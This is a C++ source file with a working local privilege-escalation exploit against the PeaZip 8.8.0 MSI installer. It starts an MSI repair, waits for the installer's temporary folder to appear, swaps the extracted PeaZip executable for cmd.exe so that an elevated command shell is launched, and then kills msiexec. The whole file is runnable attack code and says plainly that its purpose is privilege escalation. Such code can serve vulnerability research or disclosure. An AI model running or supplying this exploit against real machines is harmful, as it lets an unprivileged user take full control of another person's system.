// peazip_lpe.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <conio.h>
#include <iostream>
#include <Windows.h>

const std::string dir = R"(C:\Users\USER\AppData\Local\Temp\*)";
const std::string file = "MW-";
const std::string peazip = "\\peazip-8.8.0.WIN64.exe";

void create_process_cmd(std::string cmd) {
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	CreateProcessA(NULL, cmd.data(), NULL, NULL, false, 0, NULL, NULL, &info, &processInfo);
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
}
std::string get_file_name() {
	HANDLE dir_handle{};
	WIN32_FIND_DATAA file_attributes{};
	dir_handle = FindFirstFileA(dir.c_str(), &file_attributes);
	do {
		if (strstr(file_attributes.cFileName, file.c_str()) != nullptr) {
			return file_attributes.cFileName;
		}
	} while (FindNextFileA(dir_handle, &file_attributes) != 0);
	CloseHandle(dir_handle);

	return "";
}
void cleanup(const std::string& file_name) {
	if (!file_name.empty()) {
		const std::string delete_dir = R"(C:\Users\USER\AppData\Local\Temp\)" + file_name;
		printf("[+] Old peazip temp directory found, deleting %s\n", delete_dir.c_str());
		DeleteFile((delete_dir + "\\msiwrapper.ini").c_str());
		DeleteFile((delete_dir + peazip).c_str());
		RemoveDirectory(delete_dir.c_str());
	}
}

int main()
{
	std::string file_name = get_file_name();
	cleanup(file_name);

	(void)printf("Click any key to begin the privilege escalation\n");
	(void)_getch();
	
	create_process_cmd("msiexec.exe /fa pea.msi");

	bool run = true;
    while (run) {
		file_name = get_file_name();
		if (!file_name.empty()) {
			Sleep(600);
			printf("[+] Directory found: %s\n", file_name.c_str());
			std::string file_dir = R"(C:\Users\USER\AppData\Local\Temp\)" + file_name += peazip;
			printf("%s\n", file_dir.c_str());
			CopyFile(R"(C:\Windows\System32\cmd.exe)", file_dir.c_str(), false);
			printf("[+] File replaced!\n");
			run = false;
		}
    }
	Sleep(1000);
	create_process_cmd("taskkill.exe /IM \"msiexec.exe\" /F /T");

	return 0;
}
